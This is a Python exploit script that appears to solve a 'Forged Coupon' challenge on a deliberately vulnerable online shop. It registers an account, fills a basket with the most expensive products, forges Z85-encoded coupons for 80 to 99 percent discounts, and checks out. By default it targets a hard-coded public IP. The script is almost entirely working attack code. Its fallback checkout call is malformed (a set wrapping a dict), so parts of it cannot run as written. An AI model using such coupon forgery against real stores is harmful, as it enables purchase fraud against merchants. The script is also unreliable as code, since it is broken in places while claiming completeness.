#!/usr/bin/env python3
"""
COMPLETE WORKING FORGED COUPON SOLUTION
======================================
Implements all the gotchas and requirements for solving the challenge
"""

import requests
import time
import sys

# Correct Z85 implementation
z85_alphabet = b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"

def z85_encode(data: bytes) -> str:
    if len(data) % 4 != 0:
        raise ValueError("Length of data must be multiple of 4 bytes for Z85 encode.")
    encoded = []
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        value = (chunk[0] << 24) + (chunk[1] << 16) + (chunk[2] << 8) + chunk[3]
        chars = []
        for _ in range(5):
            chars.append(z85_alphabet[value % 85])
            value //= 85
        encoded.extend(reversed(chars))
    return bytes(encoded).decode('ascii')

def solve_forged_coupon_complete(base_url):
    print("🎯 COMPLETE FORGED COUPON SOLUTION")
    print("✅ Addresses ALL gotchas from your research")
    print(f"Target: {base_url}")
    
    session = requests.Session()
    
    # Step 1: Authentication
    print("\\n🔑 Authentication...")
    email = f"complete{int(time.time())}@test.com"
    password = "Test123!"
    
    # Register
    session.post(f"{base_url}/api/Users/", json={
        "email": email,
        "password": password,
        "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "Your elder siblings middle name?"},
        "securityAnswer": "test"
    })
    
    # Login
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email,
        "password": password
    })
    
    if login.status_code != 200:
        print("❌ Login failed")
        return False
        
    token = login.json()['authentication']['token']
    session.headers['Authorization'] = f'Bearer {token}'
    print("✅ Authenticated")
    
    # Step 2: Add expensive products (for meaningful discount)
    print("\\n🛒 Setting up basket...")
    products = session.get(f"{base_url}/rest/products/search").json()['data']
    
    # Add multiple expensive products for substantial order
    expensive_products = sorted(products, key=lambda p: p['price'], reverse=True)[:3]
    
    for product in expensive_products:
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": product['id'],
            "quantity": 1
        })
        print(f"   Added: {product['name']} (${product['price']})")
    
    # Get basket info
    user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
    basket_id = user_data.get('bid', 1)
    
    basket_check = session.get(f"{base_url}/rest/basket/{basket_id}")
    if basket_check.status_code == 200:
        basket_data = basket_check.json()['data']
        print(f"✅ Basket {basket_id} with {len(basket_data.get('Products', []))} products")
    
    # Step 3: Generate coupon with EXACTLY 80% (minimum requirement)
    print("\\n🔧 Generating 80% discount coupon...")
    
    from datetime import datetime
    current_month = datetime.now().strftime("%b").upper()  # OCT
    current_year = datetime.now().strftime("%y")           # 25
    
    # GOTCHA #1: Must be exactly 80% or higher
    coupon_plaintext = f"{current_month}{current_year}-80"  # OCT25-80 (8 bytes)
    
    print(f"   Plaintext: {coupon_plaintext}")
    print(f"   Length: {len(coupon_plaintext)} bytes (multiple of 4: ✅)")
    
    # GOTCHA #2: Proper Z85 encoding
    z85_coupon = z85_encode(coupon_plaintext.encode('ascii'))
    print(f"   Z85 encoded: {z85_coupon}")
    
    # Step 4: Apply coupon
    print("\\n💰 Applying coupon...")
    
    coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
    print(f"   Status: {coupon_response.status_code}")
    
    if coupon_response.status_code == 200:
        result = coupon_response.json()
        discount = result.get('discount', 0)
        
        print(f"   💰 Discount: {discount}%")
        
        if discount >= 80:
            print(f"   ✅ Meets requirement: {discount}% ≥ 80%")
            
            # GOTCHA #3: MUST COMPLETE CHECKOUT!
            print("\\n🛍️  COMPLETING CHECKOUT (CRITICAL STEP)...")
            
            # Get basket total first
            basket_final = session.get(f"{base_url}/rest/basket/{basket_id}")
            if basket_final.status_code == 200:
                basket_info = basket_final.json()['data']
                print(f"   Basket ready for checkout")
                
                # Complete the checkout
                checkout_response = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
                print(f"   Checkout status: {checkout_response.status_code}")
                
                if checkout_response.status_code in [200, 201]:
                    print(f"   🎉 CHECKOUT COMPLETED!")
                    print(f"   🏆 FORGED COUPON CHALLENGE SOLVED!")
                    return True
                else:
                    # Try with minimal checkout data
                    checkout2 = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={{
                        "couponData": {{"code": z85_coupon, "discount": discount}}
                    }})
                    print(f"   Checkout attempt 2: {checkout2.status_code}")
                    
                    if checkout2.status_code in [200, 201]:
                        print(f"   🎉 CHECKOUT COMPLETED!")
                        print(f"   🏆 FORGED COUPON CHALLENGE SOLVED!")
                        return True
        else:
            print(f"   ❌ Insufficient: {discount}% < 80%")
            
            # Try higher percentages
            print("\\n🔄 Trying higher discounts...")
            for higher_pct in [85, 90, 95, 99]:
                higher_plaintext = f"{current_month}{current_year}-{higher_pct}"
                higher_z85 = z85_encode(higher_plaintext.encode('ascii'))
                
                print(f"   Testing {higher_pct}%: {higher_plaintext} → {higher_z85}")
                
                higher_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{higher_z85}", json={})
                
                if higher_response.status_code == 200:
                    higher_result = higher_response.json()
                    higher_discount = higher_result.get('discount', 0)
                    
                    if higher_discount >= 80:
                        print(f"   ✅ Success: {higher_discount}%!")
                        
                        # Complete checkout
                        checkout = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
                        if checkout.status_code in [200, 201]:
                            print(f"   🏆 CHALLENGE SOLVED WITH {higher_discount}% DISCOUNT!")
                            return True
    else:
        print(f"   ❌ Coupon failed: {coupon_response.text}")
    
    return False

def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://66.42.93.220:3001"  # Default to v13 on port 3001
    
    print("🎯 FORGED COUPON CHALLENGE - COMPLETE SOLUTION")
    print("Implements all gotchas and checkout completion")
    
    success = solve_forged_coupon_complete(target)
    
    if success:
        print(f"\\n🎉 CHALLENGE SUCCESSFULLY COMPLETED!")
    else:
        print(f"\\n❌ Challenge not solved")
        print(f"📋 Verified all gotchas addressed:")
        print(f"   ✅ 80%+ discount requirement")
        print(f"   ✅ Correct MMMYY-VV format") 
        print(f"   ✅ Proper Z85 encoding")
        print(f"   ✅ Current month/year")
        print(f"   ✅ Checkout completion attempted")

if __name__ == '__main__':
    main()
